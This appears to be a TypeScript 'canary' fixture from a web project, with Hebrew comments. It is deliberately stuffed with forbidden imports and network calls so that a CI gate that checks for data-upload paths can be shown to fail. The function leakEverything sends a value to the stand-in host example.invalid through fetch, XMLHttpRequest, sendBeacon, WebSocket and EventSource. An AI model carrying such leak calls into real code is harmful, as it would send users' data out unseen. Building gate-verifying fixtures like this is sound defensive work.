// ============================================================================
// canary.ts — ★★ קובץ הפיתיון. **כל סימן אסור, במכוון.**
//
// ⛔ אינו חלק מהאפליקציה. אף קובץ תחת `src/` או `shared/` אינו מייבא אותו,
// והוא אינו מגיע לשום גרף בנייה — לא של הדפדפן ולא של ה-Functions.
//
// ---------------------------------------------------------------------------
// למה קובץ כזה קיים בכלל בריפו
// ---------------------------------------------------------------------------
// שער CI שאיש לא ראה אותו נכשל הוא שער שאי אפשר לדעת אם הוא עובד. הצורה
// הנפוצה שבה בקרה מתה בשקט היא **לא** מחיקה שלה, אלא שינוי קטן שהופך אותה
// לבדיקה שעוברת תמיד. הקובץ הזה הוא מה שהופך את "השער תופס" לטענה שנבדקת
// בכל הרצה: `tests/noUploadPath.test.ts` מריץ עליו את השער ודורש כישלון,
// ומוודא שכל אחד מהסימנים ברשימה מופיע בממצאים.
// ============================================================================

import { collection } from 'firebase/firestore';
import { ref } from 'firebase/storage';
import { httpsCallable } from 'firebase/functions';
import { leakToBrowserStorage } from './canaryDeep';

/** הייבואים עצמם הם חצי מהפיתיון — הם מה שמופיע בשורת ה-`import`. */
export const forbiddenImports = { collection, ref, httpsCallable };

/** והחצי השני: הקריאות. */
export async function leakEverything(value: string): Promise<void> {
  leakToBrowserStorage(value);

  await fetch('https://example.invalid/canary', { method: 'POST', body: value });

  const request = new XMLHttpRequest();
  request.open('POST', 'https://example.invalid/canary');
  request.send(value);

  navigator.sendBeacon('https://example.invalid/canary', value);

  const socket = new WebSocket('wss://example.invalid/canary');
  socket.close();

  const stream = new EventSource('https://example.invalid/canary');
  stream.close();
}
